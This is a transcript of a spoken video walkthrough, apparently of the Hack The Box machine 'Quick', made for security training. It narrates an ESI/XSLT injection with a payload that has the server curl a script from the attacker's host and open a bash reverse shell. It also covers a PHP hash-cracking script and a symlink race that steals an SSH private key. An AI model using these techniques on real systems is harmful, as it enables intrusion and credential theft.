 what's going on youtube this is ipsec i'm doing quick from hack the box which was a super fun box because it was very challenging without being too technical you didn't have to build any complex sql injections buffer overflows or anything during this box instead there's five different websites running on four different web servers that you have to get a bunch of information around to kind of put all the pieces of the puzzle together the coolest piece of the puzzle is there's a web server out there that's running http version three which goes over udp and not tcp and i couldn't even get my firefox burp suite or curl to use that instead i pull an application called quiche from cloudflare that's a little command line http utility that you can use to hit that web server and get some good information off of it so with all that being said let's just jump in and do this box as always we're going to begin with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it quick and then the ip address which is 10 10 10 186 i'm also going to put a pseudo before nmap because nmap always likes being ran as root and of course i've already ran this command because it can take a little bit so let's just take a look at the results and we have just two ports open the first one is ssh on port 22 and its banner tells us it's an ubuntu server we also have http on port 9001 running apache httpd and of course it is ubuntu as well and since this is a weird port i'm gonna run a full port scan so let's do sudo and map dash p dash 10 10 10 186 dash o a and map quick all ports 10 10 10 186 so let that go run and let's just take a look at the page so 10 10 10 186 9001 and looking at the page uh we have some text testimonials but before i go too far into the page i always like viewing the source with control u and seeing if i can see anything i recognize something being like um wp-admin indicating it's wordpress so we can see there is a login.php so we know this is hosting php scripts we go back here and confirm that with index.php and we see we get a page if we tried index.html guessing it doesn't work so let's go and run go buster um i probably should have added a dash v here so we saw open ports as we find them but eh oh well i'm going to do go buster dash u for url http 101010 186 port 9001-w for list user share word list dirt buster then directory list 2 3 medium dash o for out file go buster dash root dash php and i'm going to do dash x for extension and put php there and i have to put this in dir mode for go buster so that should be a good command let this run and we get a bunch of pages so we see search home login.php right away going here we have this about that's not clickable so maybe there's an about.php or contact.php looking at this portal link we see portal.quick.htb and then clients clients.php so going here we have client names and countries codes or countries so based upon this this is kind of weird that they went out of the way to specify the country so i'm guessing this could mean something down the line um yeah so i have some timeouts that is unique but should be fine um say what was i going to do we want to go probably check out like search.php it's a blank page um about.php doesn't exist contact.php doesn't exist db and home let's try db.php something there home.php invalid username password and we get to login.php which wants us to log in um i just remembered what i went back to my host for i wanted to add a link to portal.quick.htb in my host file so let's do sudo vi etsy hosts and add the entries so 10 10 10 186 and that's going to be portal.quick.htb and i always like putting the quick.htb the i guess one level up of the domain because who knows when it be helpful sometimes it is sometimes it isn't but it's a pain to debug when you don't have it there so we have that we can try going to the url it's not going to work because 443 isn't open we can try just going hdp portal quick hdb on 9001 to see if we get anything different which we don't so we can try quick hdb on 9001 don't get anything as well um we can try building out emails for tim roy eliza or lisa and james and it specifies what company they're with and looking at the um was it the clients page specifies the client and the country so you can also google like country tld codes because i'm guessing we need to put some type of valid email and i was thinking like if we go to login.php send this over to burpsuite and put like a email that definitely doesn't exist like ipsec root ipsec.rocks with a password of course of please subscribe i'm just typing that horribly but it doesn't matter uh submit it senator repeater and send a request hopefully something will change of this we see this is 310 bytes and if we put a valid email here maybe it'll be more or less bytes or this will say like invalid password instead of invalid credentials um other thing i noticed that's odd is it says x powered by essie gate esi gate so if we google um exploits esi gate we have some type of injection here and this is going to be for a later part in the video i don't want to go over this because if i keep jumping back and forth it could be confusing but that's when i started reading this if you read this you'd realize it's probably not applicable yet but you keep it in your back pocket so always do recon and look for things that stand out at every step and just take notes of them so let's try building a valid email the emails and we have to put all the people so let's go to the clients and let's see quick 9001 tim roy eliza and james so tim roy eliza james and i'm only going to do the first word um if i was doing this like on an actual engagement for like dark wing solutions i'd probably do like dark wing dash solutions dark wing something or i'd actually go and query the domain look at linkedin to see if roy does work there so a lot of ways to identify valid emails if this wasn't a cta but for the sake of ctf just going to pick the first word so here is q consulting uh roy he could be two i'm not sure if that was a typo so i'm gonna do dark wing and at dirk wng because it's wng there wing here so it's probably a typo but it's going to keep that eliza at wink and james at it was like lazy coop i'm going to keep this all lower case email shouldn't matter so q consulting for each one i'm gonna do um the tld and com so dot co dot uk because he was in the uk uh and dot com roy i think this one is a us so we'll do us.com.us.com uh eliza wink is uk we'll do dot com here james lazy coupe and lazy coop is china i always get china and switzerland's tld confused oh it's china here oh it's not dod code list this is what i wanted so china i think is dot cn um yep.cn i always get china and switzerland confused because switzerland is ch i believe come on switzerland where are you dot swiss b-e yeah switzerland is ch as well so i always get those two confused i'm not sure why but lazycoop cn this could be calm so we got a list of 10 emails so i'm going to do w fuzz dash h for the help uh let's see dash u is url http 10 1010 186 9001 slash login dot php uh dash d is for post data so if we look at the login request it's here so email and password email is equal to fuzz and password is equal to please work and we can launch this and we must specify a payload so dash w emails to do a word list and everyone is the same we can't tell what's different so at this point i'm gonna do a proxy so w fuzz dash h grep proxy grep i proxy so it wants ip port type so let's do w fuzz 12701 8080 http go over to burp and let's just make sure the uh w fuzz is working i have maybe it wants caps okay so looking at this this query looks correct we can send it over to repeater and we get the same exact thing so we don't have a valid way of enumerating emails yet and if we can't enumerate emails i don't want to go try brute forcing things because brute forcing something that may not exist would be painful so let's take a look uh we got portal quick hdb doesn't work login nothing there going back to go buster there is ticket.php so we can go 101010186 ticket.php and it brings us back to a login page so reading this we see we are migrating a portal with the latest tls and http support so if you like go google like latest http version let's see so on one two there is a three uh if i just google oh http version three i said oh because it kind of appeared in the search history or search recommendations and we go here and you read this wikipedia page you would see http 3 is a draft based upon a previous rfc but it's http over quick quic which sounds like quick from the machine name and it's developed initially by google but goes over udp so let's go take a look at udp um our nmap finished of all ports didn't have anything so we could do nmap dash su maybe i'm not sure if this will work uh udp is always iffy when you do nmap i'm also going to add the dash v flag and if you tried like um netcat uh v 10 10 10 186 443 uh we have to do dash u for udp you may be like huzzah it's definitely working we're connected but keep in mind um udp is connectionless so if you specify anything here like 9001 it's not going to work it says the same exact thing you can do nmap so pseudo nmap dash su for udp 10 10 10 186 dash p 443 80 9001 22. let's try this and we see they're all open slash filtered so hoping one wouldn't be let's try four four four pseudo and map su so maybe there's a firewall in play because we specify a port that isn't supposed to be listening it immediately says closed um [Music] why is 9001 open 9002 so we can see this nmap scan with udp is um not the most reliable it's showing different things pretty much every time and we need root so not sure exactly what's going on here um the easiest way to do it is just to test it so we could try like going over to firefox um about config and enabling http 3 but that's not going to work because i think the web server has to be listening on um uh 443 tcp and then redirect you to this for firefox to pick it up we could try curl if we go back over to this terminal code h grep http 3 there is an option we do curl dash dash http 3 https portal quick hdb we see the libcro version doesn't support this and i think the way you get this working is manually compile curl but i always hate mainly compiling a program that my os like package management handles so i'm not going to go that route i'm going to build a special package just because it seems the safest to me whenever you start replacing packages that the apt or yum or dnf whatever package management you're using has weird things can happen so i'm gonna google quick hdb3 client github and see what comes up the very first result is cloudflare quiche or kwish i don't know how to pronounce it it's probably quiche despite how you spell keyshadow now um let's see is there build instructions looks like there is so git clone recursive so let's do this and whenever i install a package from like git or something i always put that one in slash opt so i'm gonna let this command finish now that's done we can go in the directory the next thing it wants to do is cargo build examples i'm going to make sure we have cargo installed so sudo apt install cargo and it looks like it is already installed so cargo build examples and this can take a while so i'm just going to let this one run and speed up the video and it looks like it didn't work because we need cmake so i'm going to do sudo apt update and and sudo apt install cmake probably should add a dash y so it auto accepts the prompt when it comes up but let's install cmake and then we'll try this cargo command again cmake is installed so let's do the cargo build examples and this one can take a while so i'm going to speed up the video yet again it's a lot of editing for me to do around this time so it looks like it has finished installing so let's go into target debug build and that may not be it probably target debug examples and we have http 3 client so let's try executing that and it wants a url so let's do https portal quick.htb and we get a page and right off the bat i notice there's a view equals docs in this index.php thing so the first thing i want to do is let's kind of uh dirtboss to this a little bit like docs.php we get a 404 let's just try docs and we get a 301 so there may be documents inside of slash docs about not sure there but the main thing i was looking for is if about.php existed because what a lot of applications do when i see view equals then a word that looks like a page is it's just a include statement and they append.php but since i can't find the file that this is i'm going to ignore doing lfi things for now because this may just be pulling from a database or something else if i ever can find out that it's for sure pulling from a file that's when i try local file inclusion or if i'm just running against a wall and don't have anything so nothing up top there so let's try looking at [Music] view equals contact and we could also save this to a page so this could be like contact.html and then in firefox we should be able to open this page so root hdb not root home users or home yep hdb home uh home ipsec my bad home ipsec hdb quick and then go to when map what direct am i in oh i'm in opt uh quiche whatever so let's do move contact to hdb quick and then we can open up the page and see what it looks like abc a abc let's send this over to burp suite submit i don't know what just happened uh it tried to submit to itself not sure um we have a way to submit stuff to a page so we may have to look into that more but let's just go see what else there is um there is about so index.php equals question mark view equals about and we have more emails john mike jane so let's go back here the emails was it john at quick.htb jnetquick.htb and mike at quick.htb and we can try these emails so w fuzz is there a dash d i'm not sure what window i did that w fuzz in uh we'll just redo it w fuzz dash u htp 10 10 10 186 port 9001 dash w emails and then dash d email equals fuzz and password equals please work and that definitely is not it because i'm getting something completely different unless emails is there try going back here repeater tab email equals password equals login.php i did not specify login.php there we go and they're all still the same so those emails did not help us one bit um we can go back here and try the last page which is view equals docs and we have two documents quickstart.pdf and connectivity.pdf so let's do docs quick start dot pdf and let's just direct this to a file quickstart.pdf and then the other one was connectivity.pdf okay let's open up a file browser we can probably just do this in um this firefox movestar.pdf to hdb boxes hdb quick connectivity.pdf once the rail is up and running go to quick login.jsp and we can use this as the default password so let's save this and i'm going to look at this link it just goes to quick.htb let's take a look at the other page which was and we don't really get anything so let's go back to our w fuzz and use this password so w fuzz and put this password in and one actually gets us a 302 redirect eliza wink dot co dot uk so let's go back to the login page at 10 10 10 186 9001 have to tell burp not to intercept and hopefully you can't hear that rain outside it is storming bad by me right now but let's try logging in and what was that password we can grab this password well again and we get a page we can track your tickets so let's see what we can do here um these are not links don't have anything there we can raise ticket home we're logged in and i'm not going to run another go buster because it's obvious we're on the same site i don't know why oh that's nmap um because now when we go probably search.php we can actually hit something if we do search.php please provide a search item so with the php session we can now access the pages we couldn't before so there was also db.php and ticket.php so db.php you normally can't access db or database.php or config.php on any website uh was it ticket.php we can submit a ticket so let's go back we got track ticket so let's do test and we'll look at this one in bert and then i'm going to just click send 200 okay we don't have anything so i'm going to do single quote like that or one equals one seeing if we can do any basic sql injection just things i test and doesn't look like we get anything but i probably should revisit this when we actually have a response so let's go create a ticket we can turn intercept off test and just click submit ticket 9792 so if we do search here not sure why that's not working we can do this take it 9792 nothing what say proxy oh interceptor's off okay send and we don't have anything we don't have a cookie anymore i don't know what just happened home okay intruder intercept on click on home okay we got a cookie click search doesn't have the cookie oh it's going to quick.hdb and we're not so this is some weird browser protection um let's log off real quick or log off by just going to quick.hdb unable to connect do we not add that in the host file be etsy hearse i did oh 9001 i'm flailing all around right that now i'm going to compose myself so this should fix that so get started to log in eliza at what was it got emails uk and then the password where is it here's the password i should open up cherrytree or something and log this okay so now the url is quick.heb so when this does some weird web request um it'll actually put the cookie in zero results yep so that's what i expected to see so if i turn this proxy back on uh when i click that it now puts the cookie and again the issue happened was i was on a page called 10 10 10 186 according to my browser and then it was sending me to quick.htb which is a whole different domain in terms of cookie storage so i didn't have a cookie to quick.htb i had a cookie to 1010 1086 so my browser did not send the cookie when i click search so for now we can just click copy this paste it here and click go and we can retrieve that ticket so the first thing i want to probably do is brute force tickets so let's go back to wfuzz so w fuzz dash h grep dash i cookie and once b for specify cookie um so let's do b like that and we'll do dash u for url http quick.htb port 9001 w word list so we're going to have to create our own word list here so let's do v word list gen dot sh for i n sequence dash f and we'll do ticket is four so percent zero four g i think zero and a thousand or nine nine nine nine is what i want so what that just did was if we whoops do sequence zero a 100 you can see how it prints it out if we do sequence dash f for format percent 0 5 g and now pads or zero 4g i should do so it puts it in the format of a ticket so that's what that did do oh we can just do do that's how i like doing my bash loops um echo i done so bash for list gen two word list and i'm sure there's probably a way i could have done this in w fuzz but i don't know w fuzz is syntax off top my head uh let's see we i go to hdb quick and let's see this is going to be search.php there's a ticket.php search search equals tkt dash fuzz and when we get to 9742 we should have something um let's see grep word list nine seven uh crap nine seven out of word list too short so to save time i just did it this way and let's see nine seven four two looks exactly the same that shouldn't be the case tkt so let's send this back over to burp suite so 127.001 8080 http proxy go cookie php id looks good 9742 and we don't get anything let's raise the ticket test okay 4732. so we'll search this four seven three run this again without the proxy okay that's what we wanted so we won't just hide everything that's 53 or 15 words so i'm just gonna do hw five and now we're only getting the ticket we have so this is gonna enable us to view all the tickets in the help desk as long as we have permission to see this so word list and it's going to fuzz them all and it won't really get anything so this comes back to the um x powered by thing we go back here so it's sc gate and the other thing i'd probably do um [Music] 4732 let's try a bunch of like sql stuff now that i know what a valid query looks like but not going to get any with that so let's go look at this essie gate sc gate exploit turn burp off and go in here and let's see so this is um xml any injection if we go to ipsec dot rocks xslt uh bootstrap xl that's not it xml and the these videos would probably help you um devoops patents and mana verde but we're just going to copy this payload and we're going to create a ticket with this payload and this is kind of like middleware to make applications work together or something but if you had read that whole thing which i'm not doing because this video and it would take like probably 10 to 15 minutes and it's not entertaining to watch me just scroll uh support our ips here so 10 10 14 2 slash um [Music] this will be what was this example they have anything news.xml this will be pwn.xml and then this evil.com 10 10 14 2 esi.xsl so we can create this ticket 1933. so if we search for tkt-1933 we don't really get a response back we go back into burp tkt 1933 we get connection refused and this weird bad gateway message if we go back to our host box uh nclvnp 80 sudo we get a connection so we know we have some type of execution here because we can force this web page to connect back to us if you keep reading this there is a rce so let's try this so copy this let's paste a new ticket submit three five eight one so go back to burp three five eight one and it just goes and gives us this whole thing so um i'm trying to think of a good way to explain this uh xslt these are transform files so if you just go straight here it's not going to work however if you do it within a xml and the injection attack then it can be executed so if we change the style sheet out to be this page it'll work or it'll hit it so we should have copied this to our local box so make dur dub dub dub and this is where i said it would probably help if you viewed the other machines of doing xml any injection because this one is relatively advanced so we call it esi.xsl set paste paste that in okay and then we go back up here or we can probably go into proxy history and let's go to post where is it was it not intercepting may have not been so let's go back here raise ticket exploit and this can be 10 10 14 2 uh i don't know what we called it parent.xml and 10 10 14 2 esi.xsl i'm just going to put this in burp so it's in my history tab we can turn repeater off which is or not repeater intercept submit 3838 go back here repeater 3838 connection refused so let's set up a web server i'm going to touch parent.html real quick uh python-m http server80 and we have to do it with sudo python3 and let's see get esi.xsl pound.x what was that file not found looks like it did three requests and eventually landed at a foul not found and now it's going getting this whole url um that's weird esi.excel instead of touch pound i'm going to do let's do curl http 10 10 14 2 and success so if we ever see the server hit our web server with success we know it worked so try this again and it keeps doing a whole get request on this whole url which is weird um we do sudo nc lvmp80 we can see what i'm talking about get and then this and not sure why the web server is doing that on if it's seen that file before then it does this so if we created a new ticket and did it it wouldn't do that um then go to the proxy history post change this ticket we'll change the ticket name to leet so ticket 1337 okay go back to our web server and it'll be the same files and it's probably going to get just the xsl this time so let's go back here take it one three three seven i'm not sure why i didn't do that i wonder if we have to rename this whole file but instead of debugging this a weird thing uh php will actually return the file so if we do sudo php dash s to be this web server it's still going to do that weird get request as you can see it's getting this but it actually returns so that's good uh parent.xml not found i have parent.html so pwn.xml and if you really wanted to and didn't believe me we can wireshark this and look at this get request because i am baffled at what goes on here i have something going on go buster still go buster is still running cancel that step back up and we can go to burp run and look at the requests we're doing a get on success which is good so follow this request and you can see it gets this whole thing but the php web server is like yeah i knew what you were doing i'm just going to get rid of this and give you the slash esi.xml or xsl so handy to know how tools work and ways around quick problems um we could have like wrote a python script to always return this file upon a fail but yeah i don't know what just happened there reset okay i'm not sure why it opened up in links but okay so we have a way to execute code so let's go back to this xsl file type reset here uh kill the pain open the pane there we go so let's go esi and let's try executing a reverse shell so we can do c data is equal to bash dash c bash dash i um was it zero and one at the end like this i think that's it uh let's do bash reverse shell you think as much as i type this i 100 get it right every time but every now and then i don't so bracket like that yep that's good so save that uh we did 9001 right we did not do a port 9001 and try to run this and we don't get a shell so we can try editing this again and instead of um by passing like this i'm going to lower the bad characters and we're just going to do echo this as base 64. i don't like that plus can we get rid of that somehow okay okay i'm just adding spacing there we go so no special characters in this base64 um free echo dash n base64-d bash nclvmp 9001 it works so now we can do i'll try bash i real quick okay that's probably what i want to do so we can copy this and try this command because this has much less special characters than the previous one uh esi xsl put that here and we can try executing it and we still don't have a shell so bummer uh the last thing we can probably do is drop the box so i'm gonna do bash dash c bash dash i dev tcp 10 10 14 2 9 000 1. v esi.xsl and we're going to go back to the curl command that we had working before so we can do curl 10 10 14 2 pound o tampon send it and we see it had downloaded pwn so we can edit this script again and this time just execute tempone so i'm guessing what it didn't like was the pipe character before and that's by why the reverse shell did not work i have a typo the bone so we have to oh do the curl again girl 10 10 14 2 pound saved it okay and now we should be able to bash and execute what i was saying before is this is probably a wrapper around like system like this and then it's putting a comma here and doing arguments and the special characters like the pipe and stuff won't work when it's in an argument form so that's probably why the reverse shells were trying did not work because we do a bunch of special redirectors and that's just not how oh god it works so save it listen execute maybe it didn't like overwriting that file so hit you a bunch i guess i should not have explained it because you raised my history girl 10 10 14 2 temp sorry i feel bad whenever i fumble around this much cat pound bash is right okay that looks good so i downloaded phone but saved it as sorry and now i should just be able to execute it did not execute the poem so the weird thing about this is i'm just going to move prone to sorry before i was actually getting the netcat connection but it just didn't work uh you can see right here when i renamed it to sorry it just didn't do anything so i'm not sure why that happened but uh we probably should rename this to please work okay so let's go back into the xsl this piece of the video is taking much longer than i thought it would have uh girl 10 10 14 2 please work temp oh i didn't do dasho that's what i forgot that's probably what i forgot before too so now we can just do bash and we get a shell after way too long uh oh well i probably should have ran script before i did this show but i'm not going to go back and fix it it's good how it is script would allow me to log all the commands so python c import pty pty dot spawn then bash oh god i screwed that python command up and now my terminal is dead cdw on this php web server make their shells script sam.log nclvmp 9001 run it now we can do python import pty pty spawn ben bash who am i i wonder if i screwed up my standard out or something because that should work which python i probably forgot the bash dash i and please work cd dub dub dub oh crap well at least you know what happens when you forget that piece oh okay so p e s i dot xsl curl 10 10 14 2 please work dash o okay bash flash temp and me put slash temp here i should just at this point have multiple of these files so i can stop adding it like this shell and i really hope okay now it works uh python c import pty pty dot spawn pin bash there we go stty raw minus echo hit fg enter enter twice and now we have a shell and this time for real i can get rid of that annoying thing so export term is equal to x term now i can clear the screen and we can begin normally i'd run len p's or linda noom but i fumbled around enough so let's just manually look at things uh find dot and that s a gate is noisy and something's weird with my terminal we may want to set the rows and columns at some point but i'm going to do grep dash v see gate to hide that and we can also add a ls to show file sizes and things like that um as when i forgot to put the slash temp it saved there we have bash history going to devnl so that's not there but we do have a myos mysql history of march 20th so if we edit this file we can see it's using the quick database and just dumping the users it looks like users.txt so not too much uh let's go vert dub dub dub and there are three directories html jobs and parameters so if we look at html let's review files look at jobs there's nothing look at printer we have a few um app printer db home job whatever so let's go into etsy apache 2 and grep dash i printer or dash capital r printer and we can see inside of default comp we have a document root of verb dub dub printer and the server name is this so if we cater this file you could see exactly how it's configured we can see virtual host anything on port 80. go to verwe html anything on 80 go to wait oh so this is on port 80. um there should be a 443 i guess maybe that's the ssl hold on sites available okay yeah default ssl.com this is probably what's listing on port 9001 it was apache or port 9 crap dash uh what port is it yeah 9001 it's java what oh so it's got some java that's that's what essa get is so this is some middleware and it's passing it to um this apache okay that makes sense then so i'm guessing once we're root we could find that easier uh psef grep esi home sam homesam has to get distribution is there a comp file here cd apps uh cat as a gate dot properties crap 9001. so something on java is listening on port 9001 and directing people to apache which is on port 80. so that's how the http config is working oh that was confusing so sites available so if we look at default comp virtual host 80 doesn't have a host name or anything and that's going to ver dub dub dub html and if we look here this one server name printer v2.quick.htb and it's going to verwf printer so i bet if we copy this and go into our host file with sudo vi etsy hosts and put this new domain in maybe it'll work uh we probably have to do port 9001 and we get a sign in so we could have also probably logged in through ssh or used chisel to do a proxy and accessed it on localhost 80. but we can use the essa gate middleware to direct us to port 80. um email address we can try eliza at whatever it was uh forgot a password or email and password so it helps to do notes paste that and we can go back into firefox file quickstart spy file connectivity here's the password paste and burp on intercept on login repeater and valid credentials so we could go back into wfas and do this again however it's looking very much the same so we have to get someone's password and if we looked at that history file for my sequel uh it's probably pretty obvious we have to go into the database to log in so vera www i mean the other thing we could do instead of trying to get credentials is looking at probably index.php and seeing if there's a sql injection we can see this is using parameterized queries so or prepared statements whatever you want to call them so probably not sql injectable from just quick glancing at it and we need server admin at quick.htb so let's cat db.php and we can see it goes to the quick database we can also go html db.php and it's doing the same exact thing so both them go to the same database so we can do mysql dash u db underscore adm dash p db underscore p for ss uh use quick select star from users and we have elisa and server admin so here's a hash it looks like md5 echo dash n wc-c 32 characters so most likely md5 try to google it and we don't get anything we can try hashes.org what huh so i guess the site's been down for a while uh track station and try going here copy hash copy hash log in uh stairs crack we don't get anything so let's take a look to see if this is actually md5 so i'm going to save this the hash paste and let's go printer let's look at this login function let's see let's fix the tty real quick stty dash a 34136 sdty rose 34 columns 136. there we go see vim index.php so i have colors so let's see email password so it's doing md5 crypt password fa what is that function php dash a so let's do echo crypt please subscribe f a okay so it's not just depending if for some reason that was just appending f a to the password then what i would do is probably use hashcat and do a custom rule file so i'd go through rocky.text and probably do a rule file that consists of dollar f to append f to the string and then dollar a to append a to every character i'm sure i've done that in video before ipsec.rocks hashcat rule i don't know i thought i've done that before maybe not but we can't use a hashcat rule file anyways because crypt is mangling the password big time so i guess we have to create our own brute force script quit cat hash so let's see and create brute dot php and the reason why i'm doing it php is because that's what the crypt function written is written in for the website so hash is equal to the hash word list is equal to user share word list rockyou.txt and then we can do for each word list as word echo word let's see if this works php root invalid arguments applied for four each oh um this probably needs to be or list is equal to is it file get contents i was trying to be if it's f open if i'll get contents uh still invalid thing uh this may not be an array so let's do explode to turn it into an array and exploit it based upon line break there we go so i don't have a slash n to do a new line but that works so now we can do attempt is equal to md5 crypt word fa and if hash is equal to attempt it's php so let's do secure coding and do three equals to signify also the same exact type this will be echo correct word you join strings in php with periods and this should be in parentheses i think echo actually works with and without parentheses in php i think that's good we may want to exit zero and there we go semicolons everywhere and run this and hope it cracks and it looks like it did so we have yl51pbx so if we go back here let's do printers it was srv admin at quick.htb paste the password click login come on server respond i wonder if um that's waiting on like a responder request go here let's unmask this so i can copy it paste again invalid credentials uh srv admin at quick.htb srv maybe i did svr quick.hdb that is what i have is the password i wonder what check me out is does huh go back here sov admin at quick.htb yeah invalid credentials copy paste adm wow uh the mistakes you make when you just do something for a long time can't stress enough how helpful it is every now and then to just take breaks go like exercise or something and come back to the problem you'll be surprised with some of the things you overlook so login and we get this picture we go to printers no prints have been added please add one so let's call this ipsec type only network profile default we can put our ip address 10 10 14 2 add printer and let's listen on 9100 go back to printers we can print the job whereas up please add a job please subscribe to ipsec print cannot connect we already got a connection i'm going to do the dash k option to leave the connection open after something happens job assigned and we got something printed so we have to now probably look at the logic on how this sends it to port 9100 so let's go look at some php code add printer probably not there um printers.php sounds good so prepare select ipport from jobs can't connect so maybe add job how's it create a job so v job.php so it's doing a file put contents and then ch modding it to 777 and then preparing and for actually printing it's doing a file get contents on that file so we can probably just put a sim link over top of the file so let's see um let's go dot jobs for i n sec 0 100 do echo ls done i don't want echo i just want ls okay so let's do some i guess sleep point two we could also do uh ghostbuy i believe it is or ps buy to look at file creation events on the file system print so that's the name so let's see we gotta create a script to upon finding a valid name delete the name and sim link so let's do vi or we can do it here vi print exploit dot sh for i and zero sure do slate point two sure x is equal to ls done so make to attempt cd temp touch t so x is equal to ls and x is now t so we just verified that that logic will work so what do we call this not word list gen print exploit so rm which why do paths ver dub dub dub jobs rm ver www.jobs slash x add a dash f so it doesn't ask us ln s root sh id rsa to verb dub dub dub jobs like that and we probably don't have to do um it this way we could probably just mainly add in the database to print something uh maybe i'll look at that after this that should work so let's try this it's either going to work or fail horribly nc be test.sh probably should put it up one directory probably can't write there let's do dev shm paste bash to execute it oh can't remove because it's a directory oh it's got id rsa there now uh test rsh oh god uh exit cat ln h help let's see let's just do ln hash link cat link i don't know why it created the file oh no yeah so it probably created the file idrsa because x was blank that's fine let's just try this probably should have my netcat running and sign the job so try it again maybe we should send this over to burp suite so we can send it multiple times proxy send repeater see is this actually working go yeah but our script is not test va so maybe something's wrong with test.sh let's take this sleepout and just do this quickly so i did windows key left and windows key right to change the sizes so i'm going to hit that and go that is way too quick the terminal window is screwed up windows key up to maximize it and we probably need let's see zero to nine star like that and let's see dash f them turn burp suite off uh let's see we should just be able to do f x like that then fi this probably just upset a lot of people i did both a combination of tabs and spaces upset myself with that one let's try this bash test.sh we can get rid of this zero to nine sweet okay and i'm also gonna do lsla ver dub dub dub jobs before and after okay left like that run send let's try maybe not symbolic or maybe this um file doesn't exist the sh key file it's probably what we should have done in the first place is down a file we know exists so etsy shadow operation not permitted so can't do it that way we need that dash s so ln dash s that was needed see maybe this doesn't read as that user uh let's see that could be it um can etsy passwd do we have other users on this box pse serve admin shoot home sov admin so slash home srv adm or admin adm adm sh idrsa let's see if we have his ssh key that's frustrating there we go so now it worked so if we grab this v srv adm dot sh paste the key chmod 600 on that key sh-i key srv adm at 10 10 10 186 yes and we get in as this user so if we do a fine dot to see what files exist here see bash history is to devnl and [Music] everything is march 20th but the cash directory is interesting because it has logs so let's look at logs cups is the printer log so let's see is there anything cool here i don't know a quick way to sort all that so nothing looks good there debug uh error nope internet printing protocol that's funny uh grep dash i password nothing there let's go to conf d let's look at cups and there's a lot of stuff in this look at printers.com and we have this uh konica minolta device uri server admin at looks like a password at printerv3.quick.htb um let's go over to burp suite so we can decode this quickly because i'm guessing those percent three of percent two six is html let's see we got a password says sudo oh okay that's not it try s u is this the root and it is so that is the box hope you guys enjoyed it and i guess the last thing i want to do is look at this portal index.php real quick oh shoot it is lfi.html oh man so if you remember a while back in the video when we were exploring the um what is it the http 3. um i was looking for files and i guess we can go all the way back there opt quiche was it examples debug wasn't that a target cd target debug examples it was this so if we did https uh quickportal.htb hdb3 client what uh portal quick hdb uh this was talking about lfi and we tried like contact.php didn't work it's contact.html and yeah that's the file so going back it's still not vulnerable to lfi because we don't have any um user input control here the user input is on this and then it's doing static strings so in most lfi examples what they would do would this would look something like this if view equals contact i mean you wouldn't even have this you just have delete this and it would be file get contents get view dot html this would be how like vulnerable to lfi things are coded because then you have user input in this file get contents and that's when you could do like the um dot dot slashes and things like that so that'll be the box hope you guys enjoyed it take care and we'll see you all next week